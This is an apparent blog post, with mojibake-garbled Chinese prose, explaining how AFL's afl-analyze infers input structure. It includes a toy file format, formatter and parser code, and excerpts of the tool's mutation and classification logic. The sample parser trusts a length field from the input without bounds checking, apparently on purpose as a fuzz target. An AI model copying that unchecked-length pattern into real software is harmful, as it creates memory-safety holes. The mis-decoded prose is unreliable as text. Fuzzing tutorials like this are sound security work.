<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"ä¸‡ä¸€æ‰¾åˆ°äº†å‘¢","hits_empty":"ä½ è¯´çš„ ${query} æˆ‘æ€ä¹ˆæ‰¾ä¸ç€å‘¢ ","hits_stats":"æ‰¾åˆ°äº† ${hits} ä¸ªç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/2/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/[AFL%20V]%20afl-analyze/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%5BAFL%20V%5D%20afl-analyze/" class="post-title-link" itemprop="url">AFL V - afl-analyze</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:11:00 / Modified: 13:22:38" itemprop="dateCreated datePublished" datetime="2025-04-22T13:11:00+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AFL-V-afl-analyze"><a href="#AFL-V-afl-analyze" class="headerlink" title="[AFL V] afl-analyze"></a>[AFL V] afl-analyze</h1><p>æœ¬å·¥å…·ç”¨äºå°è¯•ç†è§£è¾“å…¥æ–‡ä»¶çš„ç»“æ„</p>
<h2 id="ä¸¾ä¸ªğŸŒ°"><a href="#ä¸¾ä¸ªğŸŒ°" class="headerlink" title="ä¸¾ä¸ªğŸŒ°"></a>ä¸¾ä¸ªğŸŒ°</h2><p>å‡è®¾æœ‰è¿™ä¹ˆä¸€ç§ç»“æ„:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250301145341103.png" alt="image-20250301145341103"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/dustball/myfile]</span><br><span class="line">â””â”€# xxd dustland</span><br><span class="line">00000000: 6475 7374 3400 0000 6161 6161 6161 6161  dust4...aaaaaaaa</span><br><span class="line">00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa</span><br><span class="line">00000020: 6262 6262 6262 6262 6261 6161 6161 6161  bbbbbbbbbaaaaaaa</span><br><span class="line">00000030: 6161 6162 6162 6162 6162 6161 6c61 6e64  aaababababaaland</span><br><span class="line">00000040: 3f14 1d10                                ?...</span><br></pre></td></tr></table></figure>

<p>è¯¥ç»“æ„å‰åæœ‰ä¸¤ä¸ªå…ƒæ•°æ®å—, ä¸­é—´æ˜¯æ•°æ®å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//format_dstb.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FORMAT_DSTB_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT_DSTB_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSTB_HEADER_MAGIC 0x74737564 <span class="comment">//&quot;dust&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSTB_FOOTER_MAGIC 0x646e616c <span class="comment">//&quot;ball&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> magic;</span><br><span class="line">    <span class="type">int</span> data_size;</span><br><span class="line">&#125;DSTB_Header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> magic;</span><br><span class="line">    <span class="type">unsigned</span> check_sum;</span><br><span class="line">&#125;DSTB_Footer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>æ„é€ å™¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//formatter.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;format_dstb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//formatter input output</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *input = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span> *output = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    FILE * fp = fopen(input, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="type">int</span> file_size = ftell(fp);</span><br><span class="line">    <span class="type">int</span> data_size = (file_size + <span class="number">3</span>) &amp; ~<span class="number">3</span>; <span class="comment">//round up to nearest 4 bytes</span></span><br><span class="line">    <span class="type">char</span> *data = <span class="built_in">malloc</span>(data_size);</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, data_size);</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    fread(data, <span class="number">1</span>, file_size, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    DSTB_Header header = &#123;</span><br><span class="line">        .magic = DSTB_HEADER_MAGIC,</span><br><span class="line">        .data_size = data_size</span><br><span class="line">    &#125;;</span><br><span class="line">    DSTB_Footer ender = &#123;</span><br><span class="line">        .magic = DSTB_FOOTER_MAGIC,</span><br><span class="line">        .check_sum = <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> check_sum = <span class="number">0</span>;</span><br><span class="line">    check_sum = header.magic ^ header.data_size;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; data_size; i++)&#123;</span><br><span class="line">        check_sum ^= data[i];</span><br><span class="line">    &#125;</span><br><span class="line">    check_sum ^= ender.magic;</span><br><span class="line">    ender.check_sum = check_sum;</span><br><span class="line"></span><br><span class="line">    FILE * out = fopen(output, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(&amp;header, <span class="keyword">sizeof</span>(DSTB_Header), <span class="number">1</span>, out);</span><br><span class="line">    fwrite(data, <span class="number">1</span>, data_size, out);</span><br><span class="line">    fwrite(&amp;ender, <span class="keyword">sizeof</span>(DSTB_Footer), <span class="number">1</span>, out);</span><br><span class="line">    fclose(out);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ä¸ºå…¶ç¼–å†™parser</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;format_dstb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">300</span>];</span><br><span class="line">    <span class="type">int</span> file_len = read(<span class="number">0</span>,input,<span class="number">300</span>);   <span class="comment">//ä»æ ‡å‡†è¾“å…¥è·å–</span></span><br><span class="line">    DSTB_Header *header = (DSTB_Header*)input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(header-&gt;magic!= DSTB_HEADER_MAGIC)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid header magic\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> data_size = header-&gt;data_size;</span><br><span class="line">    <span class="type">char</span> *data = input + <span class="keyword">sizeof</span>(DSTB_Header);</span><br><span class="line">    <span class="type">char</span> *footer = data + data_size; </span><br><span class="line">    DSTB_Footer *f = (DSTB_Footer*)footer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(f-&gt;magic!= DSTB_FOOTER_MAGIC)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid footer magic\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> check_sum = <span class="number">0</span>;</span><br><span class="line">    check_sum = header-&gt;magic ^ header-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;data_size;i++)&#123;</span><br><span class="line">        check_sum ^= data[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check_sum ^= f-&gt;magic;</span><br><span class="line">    check_sum ^= f-&gt;check_sum;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data size: %d\n&quot;</span>,data_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Check sum: %d\n&quot;</span>,check_sum);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(check_sum != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid check sum\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;accepted&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ¥ä¸‹æ¥ç”¨<code>afl-analyze</code>åˆ†ææ–‡ä»¶ç»“æ„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250301150622626.png" alt="image-20250301150622626"></p>
<p>aflå‘ç°äº†ä¸¤ä¸ªé­”æ•°ã€æ•°æ®å—</p>
<p>è™½ç„¶æ²¡æœ‰å‘ç°æ ¡éªŒå’Œ, ä½†æ˜¯èƒ½å‘ç°è¿™å·²ç»å¾ˆç¥å¥‡äº†</p>
<p>å¹¶ä¸”è¿™ç•Œé¢èŠ±èŠ±ç»¿ç»¿çš„, ç€å®è±ªå ª</p>
<h2 id="ğŸ§„æ³•åŸç†"><a href="#ğŸ§„æ³•åŸç†" class="headerlink" title="ğŸ§„æ³•åŸç†"></a>ğŸ§„æ³•åŸç†</h2><p>é¦–å…ˆä¿æŒè¾“å…¥ä¸å˜, dry_runä¸€æ¬¡ ,è®°å½•æ‰§è¡Œè·¯å¾„å…±äº«å†…å­˜æ ¡éªŒå’Œä¸ºorig_cksum</p>
<p>ç„¶åéå†è¾“å…¥, å¯¹äºæ¯ä¸ªå­—èŠ‚, åˆ†åˆ«è¿›è¡Œå¦‚ä¸‹å››ä¸ªå˜å¼‚æ“ä½œ:</p>
<p>1.æ•´ä½“å–å, æ‰§è¡Œ , è®°å½•æ‰§è¡Œåçš„å…±äº«å†…å­˜æ ¡éªŒå’Œxor_ff</p>
<p>2.æœ«ä½å–å, æ‰§è¡Œ , è®°å½•æ ¡éªŒå’Œxor_01</p>
<p>3.å‡å»0x10, æ‰§è¡Œ , è®°å½•æ ¡éªŒå’Œsub_10</p>
<p>4.åŠ ä¸Š0x10, æ‰§è¡Œ , è®°å½•æ ¡éªŒå’Œadd_10</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">in_data[i] ^= <span class="number">0xff</span>;</span><br><span class="line">xor_ff = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">in_data[i] ^= <span class="number">0xfe</span>;</span><br><span class="line">xor_01 = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">in_data[i] = (in_data[i] ^ <span class="number">0x01</span>) - <span class="number">0x10</span>;</span><br><span class="line">sub_10 = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">in_data[i] += <span class="number">0x20</span>;</span><br><span class="line">add_10 = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line">in_data[i] -= <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™å››ä¸ªå˜å¼‚æ“ä½œæ˜¯å•ç‹¬æ‰§è¡Œçš„, äº’ç›¸ä¸å½±å“, æ¯æ¬¡æ“ä½œä¹‹åéƒ½ä¼šå½“å‰å­—èŠ‚è¿˜åŸ</p>
</blockquote>
<p>è¿™æ ·å››ä¸ªç»“æœä¼šæœ‰16ç§æƒ…å†µ,afl-analyzeåªå…³å¿ƒå…¶ä¸­å‡ ç§æƒ…å†µ</p>
<p>1.å››ä¸ªæ£€æ ¡å’Œå‡å’Œorig_cksumä¸€è‡´, æ„å‘³ç€å¯¹è¯¥å­—èŠ‚ä»»ä½•å˜åŠ¨ä¸ä¼šå½±å“æ‰§è¡Œè·¯å¾„ ,å­—å¾®èŠ‚è½»</p>
<p>2.è¿™å››ä¸ªæ£€æ ¡å’Œä¸­æœ‰è‡³å°‘ä¸€ä¸ªä¸ç­‰äºorig_cksum, è®¤ä¸ºè¯¥å­—èŠ‚å¯ä»¥å˜å¼‚, ä½†æ˜¯ä¹Ÿå°±é‚£æ ·å§, ä¸å¤ªé‡è¦</p>
<p>3.å››æ¬¡å˜å¼‚åçš„æ£€æ ¡å’Œç›¸åŒ, ä½†æ˜¯ä¸ç­‰äºorig_cksum, åˆ™è®¤ä¸ºè¿™ä¸ªåœ°æ–¹ä¸èƒ½æ”¹, æ¯”å¦‚æ–‡ä»¶é­”æ•°,æ£€æ ¡å’Œç­‰ç­‰, è¿™é‡Œå¦‚æœä¸å¯¹äº†åˆ™parserç›´æ¥ä¸¢å¼ƒæ–‡ä»¶</p>
<p>4.å››æ¬¡å˜å¼‚ä¹‹åçš„æ£€æ ¡å’Œä¸orig_cksumå‡ä¸ç›¸åŒ, å¹¶ä¸”è¿™å››ä¸ªæ£€æ ¡å’Œä¹Ÿå„ä¸ç›¸åŒ, è¯´æ˜è¯¥ä½ç½®ä¼šæ˜¾è‘—å½±å“æ§åˆ¶æµ, å¯èƒ½æ˜¯ä¸€ä¸ªswitch caseä½ç½®æˆ–è€…ä¸€ä¸ªifçš„æ¡ä»¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xff_orig = (xor_ff == orig_cksum);</span><br><span class="line">x01_orig = (xor_01 == orig_cksum);</span><br><span class="line">s10_orig = (sub_10 == orig_cksum);</span><br><span class="line">a10_orig = (add_10 == orig_cksum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xff_orig &amp;&amp; x01_orig &amp;&amp; s10_orig &amp;&amp; a10_orig) &#123;</span><br><span class="line"></span><br><span class="line">  b_data[i] = RESP_NONE;</span><br><span class="line">  boring_len++;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (xff_orig || x01_orig || s10_orig || a10_orig) &#123;</span><br><span class="line"></span><br><span class="line">  b_data[i] = RESP_MINOR;</span><br><span class="line">  boring_len++;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (xor_ff == xor_01 &amp;&amp; xor_ff == sub_10 &amp;&amp; xor_ff == add_10) &#123;</span><br><span class="line"></span><br><span class="line">  b_data[i] = RESP_FIXED;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> b_data[i] = RESP_VARIABLE;</span><br></pre></td></tr></table></figure>





<p>è€ƒè™‘åˆ°ä¸€ä¸ªå­—æ®µå¯èƒ½æ˜¯è¿ç»­çš„å››ä¸ªå­—èŠ‚(intç±»å‹), æˆ–è€…å…«ä¸ªå­—èŠ‚ç­‰ç­‰, afl-analyzeä¼šåœ¨ç»™å½“å‰å­—èŠ‚ä¸‹ç»“è®ºä¹‹å, å†è”ç³»ä¸Šä¸€ä¸ªå­—èŠ‚çœ‹çœ‹</p>
<p>å¦‚æœä¸Šä¸€ä¸ªå­—èŠ‚å’Œå½“å‰å­—èŠ‚çš„å››ç§æ£€æ ¡å’Œ, æ¯ç§éƒ½å„è‡ªä¸ä¸€æ ·, è¯´æ˜è¿™ç›¸é‚»çš„ä¸¤ä¸ªå­—èŠ‚çš„ä½œç”¨å¤§ä¸ç›¸åŒ, åº”è¯¥æ˜¯ä¸åŒçš„å­—æ®µ.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (prev_xff != xor_ff &amp;&amp; prev_x01 != xor_01 &amp;&amp;</span><br><span class="line">    prev_s10 != sub_10 &amp;&amp; prev_a10 != add_10) seq_byte ^= <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">b_data[i] |= seq_byte;</span><br><span class="line"></span><br><span class="line">prev_xff = xor_ff;</span><br><span class="line">prev_x01 = xor_01;</span><br><span class="line">prev_s10 = sub_10;</span><br><span class="line">prev_a10 = add_10;</span><br></pre></td></tr></table></figure>





<p>ç­‰æ‰€æœ‰çš„å­—èŠ‚éƒ½å˜å¼‚ä¸€éäº†, ä¸‹é¢è¦æ‰“å°è£…ğŸ‘ƒç•Œé¢äº†, è¿™é‡Œé™¤äº†è£…ğŸ‘ƒè¿˜æ˜¯æœ‰ä¸€äº›æ¨ç†çš„</p>
<p>åˆšæ‰å·²ç»åˆæ­¥ç»™æ¯ä¸ªå­—èŠ‚æœ‰ä¸€ä¸ªåˆ¤æ–­, å¹¶ä¸”ä¹Ÿåˆ’åˆ†äº†å­—æ®µ, ç°åœ¨åˆ©ç”¨ä¸Šè¿°ä¿¡æ¯:</p>
<p>å¯¹äºå­—æ®µçš„é¦–å­—èŠ‚æ˜¯éå¸¸é‡è¦ä¸èƒ½æ”¹çš„, ä¹Ÿå°±æ˜¯ä¸Šè¿°å˜å¼‚ç»“æœä¸­çš„ç¬¬3ä¸ª, â€œå››æ¬¡å˜å¼‚åçš„æ£€æ ¡å’Œç›¸åŒ, ä½†æ˜¯ä¸ç­‰äºorig_cksum,â€</p>
<p>â€‹	å¦‚æœè¿™ä¸ªå­—æ®µé•¿2å­—èŠ‚å­—èŠ‚ </p>
<p>â€‹		å¹¶ä¸”å­—æ®µä¸Šçš„å€¼çš„å°ç«¯åºæˆ–è€…å¤§ç«¯åºå€¼, æ¯”è¾“å…¥æ•°æ®é•¿åº¦å°, é‚£ä¹ˆè®¤ä¸ºè¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªé•¿åº¦å€¼</p>
<p>â€‹		å¦åˆ™å¦‚æœè¿™ä¸ªå­—æ®µçš„é¦–å­—èŠ‚å€¼å’Œæ¬¡å­—èŠ‚å€¼ç›¸å·®è¶…è¿‡32, é‚£ä¹ˆè®¤ä¸ºè¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªæ£€æ ¡å’Œ</p>
<p>â€‹	å¦åˆ™å¦‚æœè¿™ä¸ªå­—æ®µé•¿4å­—èŠ‚,</p>
<p>â€‹		å¹¶ä¸”å­—æ®µä¸Šçš„å€¼çš„å°ç«¯åºæˆ–è€…å¤§ç«¯åºå€¼, æ¯”è¾“å…¥æ•°æ®é•¿åº¦å°, é‚£ä¹ˆè®¤ä¸ºè¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªé•¿åº¦å€¼</p>
